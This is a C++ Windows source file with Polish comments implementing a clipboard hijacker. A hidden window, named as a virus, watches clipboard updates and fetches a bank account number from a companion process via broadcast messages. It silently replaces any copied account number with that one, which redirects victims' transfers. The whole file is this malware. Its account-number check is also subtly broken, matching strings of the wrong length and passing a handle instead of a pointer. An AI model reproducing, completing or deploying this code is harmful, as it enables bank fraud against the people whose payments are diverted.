#include "main.h"

constexpr CHAR szClassName[] = "WirusMonitorujacy";
LPSTR bankAccount;
HWND hwndThis;
HWND hwndNextViewer;
UINT messageCode;
time_t start, current;
bool bAset;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (!init(hInstance)) return 1;

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);

		time(&current);
		double diff = difftime(current, start); // różnica czasu w sekundach
		if (diff >= 60.0)
		{
			// Wysłanie żądania do procesu nadawcy o konto bankowe
			PostMessage(HWND_BROADCAST, messageCode, REQUEST_NUMBER, 0);
			time(&start);
		}
	}
	return 0;
}

bool init(HINSTANCE hInstance)
{
	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hbrBackground = NULL;
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = NULL;

	if(!RegisterClassEx(&wc)) return false;

	hwndThis = CreateWindowEx(
		NULL,
		szClassName,
		"",
		WS_DISABLED,
		0, 0, 0, 0,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hwndThis == NULL) return false;
	if (!AddClipboardFormatListener(hwndThis)) return false;

	messageCode = RegisterWindowMessage((LPCSTR)"Nic podejrzanego");
	

	bankAccount = (char*)malloc(17*sizeof(char));
	bAset = false;
	time(&start);

	return true;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == messageCode)
	{
		switch (wParam)
		{
		case POST_NUMBER:
			SaveNumber(lParam);
			bAset = true;
			break;
		}
	}
	switch (msg)
	{
	case WM_CREATE:
		hwndNextViewer = SetClipboardViewer(hwnd);
		break;
	case WM_CLIPBOARDUPDATE:
		CheckForVictim();
		if (hwndNextViewer != NULL)
			SendMessage(hwndNextViewer, msg, wParam, lParam);
		break;
	case WM_CHANGECBCHAIN:
		if ((HWND)wParam == hwndNextViewer)
			hwndNextViewer = HWND(lParam);
		else
			if (hwndNextViewer != NULL)
				SendMessage(hwndNextViewer, msg, wParam, lParam);
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNextViewer);
		RemoveClipboardFormatListener(hwnd);
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

void CheckForVictim()
{
	if (!bAset)
		return;
	OpenClipboard(hwndThis);
	HGLOBAL hCbMem = GetClipboardData(CF_TEXT);
	if (hCbMem != NULL) // jest tekst - sprawdzam czy to numer konta. Jeśli tak - zamiana.
	{
		HGLOBAL hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
		if (hProgMem != NULL)
		{
			LPSTR lpCbMem = LPSTR(GlobalLock(hCbMem));
			LPSTR lpProgMem = LPSTR(GlobalLock(hProgMem));
			lstrcpy(lpProgMem, lpCbMem);
			GlobalUnlock(hCbMem);
			// hProgMem - adres tymczasowej zmiennej w schowku
			if (CheckIfAccountNumber((LPSTR)hProgMem))
				MoveToCb();
			GlobalUnlock(hProgMem);
		}
	}

	CloseClipboard();
}

// Tylko przy obsłudze komunikatu!
void MoveToCb()
{
	// zaalokowanie pamięci globalnej
	
	HGLOBAL hGlMem = GlobalAlloc(GHND, (DWORD)MAXL + 1);
	HGLOBAL lpGlMem = GlobalLock(hGlMem);

	// skopiowanie naszego numeru konta do pam. globalnej
	memcpy(lpGlMem, bankAccount, MAXL + 1);
	GlobalUnlock(hGlMem);

	// podmiana schowka
	OpenClipboard(hwndThis);
	EmptyClipboard();
	SetClipboardData(CF_TEXT, hGlMem);
	CloseClipboard();
}

bool CheckIfAccountNumber(LPSTR str)
{
	if (strlen(str) == MAXL)
		for (int i = 0; i < MAXL; i++)
		{
			if (str[i] < '0' || str[i] > '9')
				return false;
		}
	return true;
}

void SaveNumber(LONG_PTR num)
{
	//bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
	LPSTR lpGlobalMem = LPSTR(GlobalLock(HGLOBAL(num)));
	memcpy(bankAccount, lpGlobalMem, MAXL + 1);
	GlobalFree(HGLOBAL(num));
}